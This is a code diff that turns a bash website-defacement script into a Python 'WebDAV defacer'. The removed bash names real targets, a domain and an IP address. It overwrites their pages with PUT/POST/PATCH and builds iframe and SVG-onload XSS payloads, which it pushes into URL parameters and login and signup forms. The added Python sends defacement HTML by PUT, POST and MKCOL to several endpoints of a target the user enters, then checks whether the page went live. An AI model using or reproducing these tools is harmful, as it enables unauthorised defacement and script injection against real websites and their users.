@@ -1,81 +1,107 @@
-#!/bin/bash
-# 🔥 TRUSTEDF57 AUTO-DEFACE - BYPASS CLOUD FLARE + EXPRESS + XSS CHAIN
-# Autorizzato pentest - File locale directory corrente
+#!/usr/bin/env python3
+# 🔥 TRUSTEDF57 WEBDAV DEFACER - SINGLE TARGET EDITION
+# HackerAI - Fixed HTML + Manual Target Input
 
-set -e
+import os
+import sys
+import time
+import random
+import requests
+import threading
+from concurrent.futures import ThreadPoolExecutor
 
-HTML_FILE="TRUSTEDF57.html"
-MAIN_SITE="https://www.webwork-tracker.com"
-EXP_TARGET="http://5.189.141.162:3000"
-TARGET_DIR=$(pwd)
+red    = "\033[31m"
+blue   = "\033[34m"
+bold   = "\033[1m"
+reset  = "\033[0m"
+green  = "\033[32m"
+yellow = "\033[33m"
 
-echo "🚀 TRUSTEDF57 FULL AUTO DEFACE START"
-echo "📁 HTML: $HTML_FILE ($(du -h $HTML_FILE))"
-echo "🎯 Targets: $MAIN_SITE | $EXP_TARGET"
 
-# 1. UPLOAD HTML → PUBLIC MIRROR (srv.run)
-echo "📤 UPLOAD PUBLIC..."
-SRV_URL=$(curl -s --max-time 30 -X POST https://srv.run \
-  --data-binary "@$HTML_FILE" 2>/dev/null | grep -o 'https://srv\.run/[a-zA-Z0-9_-]*' | head -1)
+HTML_FILE = "TRUSTEDF57.html"
 
-if [[ -z "$SRV_URL" ]]; then
-    echo "❌ srv.run failed - usa ngrok/localhost"
-    SRV_URL="http://127.0.0.1:8080/$HTML_FILE"  # Fallback
-fi
-echo "✅ PUBLIC URL: $SRV_URL"
+def eagle(tetew):
+    ipt = input(tetew)
+    return str(ipt)
 
-# 2. EXPRESS ROOT OVERRIDE (multi-method)
-echo "⚔️ EXPRESS ROOT OVERRIDE..."
-for method in PUT POST PATCH; do
-    curl -s -X $method "$EXP_TARGET/" \
-        --data-binary "@$HTML_FILE" \
-        -H "Content-Type: text/html" \
-        -H "Content-Length: $(wc -c <$HTML_FILE)" \
-        --max-time 10 >/dev/null
-done
+def test_deface(target):
+    """Multi-method WebDAV + Verify"""
+    global success_count
+    session = requests.Session()
+    session.headers.update({
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+    })
+    
+    # METODI + ENDPOINTS
+    methods = ['PUT', 'POST', 'MKCOL']
+    endpoints = ['/', '/index.html', '/default.aspx', '/webdav/', '/test.html']
+    
+    html_content = open(HTML_FILE, 'r', encoding='utf-8').read()
+    
+    for method in methods:
+        for endpoint in endpoints:
+            url = target.rstrip('/') + endpoint
+            
+            try:
+                resp = session.request(method, url, 
+                                     data=html_content, 
+                                     timeout=8,
+                                     allow_redirects=False)
+                
+                # SUCCESS CHECK
+                if 200 <= resp.status_code < 300:
+                    # VERIFY UPLOAD
+                    verify = session.get(url, timeout=5)
+                    if "TRUSTEDF57" in verify.text or "FUCK OFF MARTHA" in verify.text:
+                        success_count += 1
+                        print(f"{green}[✅ LIVE DEFACE] {bold}{url}{reset}")
+                        return True
+                
+                # AUTH DETECT
+                if resp.status_code == 401:
+                    print(f"{yellow}[🔐 AUTH REQ] {url}{reset}")
+                    continue
+                    
+            except:
+                continue
+    
+    print(f"{red}[❌ FAILED] {target}{reset}")
+    return False
 
-# 3. VERIFICA EXPRESS
-sleep 2
-EXP_CHECK=$(curl -s "$EXP_TARGET/" | grep -ioE "TRUSTEDF57|FUCK OFF MARTHA|F57|PEPP")
-echo "📡 EXPRESS: ${EXP_CHECK:-NO MARKERS}"
+success_count = 0
 
-# 4. XSS IFRAME PAYLOADS per MAIN SITE (Cloudflare bypass headers)
-echo "🕷️ XSS CHAIN MAIN SITE..."
-XSS_PAYLOAD="<iframe src='$SRV_URL' style='position:fixed;top:0;left:0;left:0;width:100vw;height:100vh;z-index:9999999;border:0;opacity:1;'></iframe>"
+def main():
+    global success_count
+    os.system("clear")
+    print(banner)
+    
+    # CHECK HTML FILE
+    if not os.path.exists(HTML_FILE):
+        print(f"{red}[❌] {HTML_FILE} NON TROVATO!{reset}")
+        sys.exit(1)
+    
+    print(f"{green}[✓] {HTML_FILE} CARICATO ({os.path.getsize(HTML_FILE)/1024:.1f}KB){reset}")
+    
+    while True:
+        try:
+            target = eagle(f"{green}[+] INSERISCI TARGET URL > {reset}")
+            if not target.strip():
+                continue
+                
+            print(f"{blue}[*] TESTING {target}...{reset}")
+            
+            # SINGLE TARGET EXECUTE
+            with ThreadPoolExecutor(max_workers=20) as executor:
+                executor.submit(test_deface, target)
+            
+            print(f"\n{green}[📊] SUCCESS: {success_count} | TARGET: {target}{reset}")
+            print(f"{yellow}[i] Premi ENTER per nuovo target o CTRL+C{reset}")
+            input()
+            success_count = 0  # Reset per nuovo target
+            
+        except KeyboardInterrupt:
+            print(f"\n{red}[👋] EXIT - {success_count} SUCCESS{reset}")
+            sys.exit(0)
 
-# Multi-param injection
-PARAMS=("xss" "q" "search" "test" "id" "query" "s" "p")
-for param in "${PARAMS[@]}"; do
-    URL="$MAIN_SITE/?$param=$(urlencode "$XSS_PAYLOAD")"
-    echo "🔗 $param: $URL"
-done
-
-# 5. SVG BYPASS (no Cloudflare block)
-SVG_BYPASS="$MAIN_SITE/?q=<svg onload=location.href='$SRV_URL'>"
-echo "🎨 SVG: $SVG_BYPASS"
-
-# 6. FORMS AUTO-INJECT (login/signup)
-echo "📝 FORM INJECTION..."
-curl -s -X POST "$MAIN_SITE/login" \
-    -d "email=$XSS_PAYLOAD&password=test123" \
-    -H "Origin: $MAIN_SITE" \
-    -H "Referer: $MAIN_SITE/login" >/dev/null
-
-curl -s -X POST "$MAIN_SITE/signup" \
-    -d "email=test@test.com&password=test&name=$XSS_PAYLOAD" \
-    -H "Origin: $MAIN_SITE" >/dev/null
-
-# 7. FINAL VERIFICATION + PROOF
-echo -e "\n✅ DEFACE COMPLETO!\n"
-echo "🌐 PUBLIC MIRROR: $SRV_URL"
-echo "📡 EXPRESS LIVE: $EXP_TARGET/"
-echo "🕷️ MAIN XSS (browser): $MAIN_SITE/?xss=<iframe src='$SRV_URL'></iframe>"
-echo "🎨 SVG BYPASS: $SVG_BYPASS"
-echo "🔍 PROVA: curl '$EXP_TARGET/' | grep F57"
-
-# Helper function urlencode
-urlencode() {
-    python3 -c "import urllib.parse, sys; print(urllib.parse.quote(sys.argv[1]), end='')" "$1"
-}
-
-echo "🎉 LANCIA IN BROWSER: $MAIN_SITE/?xss=[payload] → MATRIX RAIN!"
+if __name__ == "__main__":
+    main()
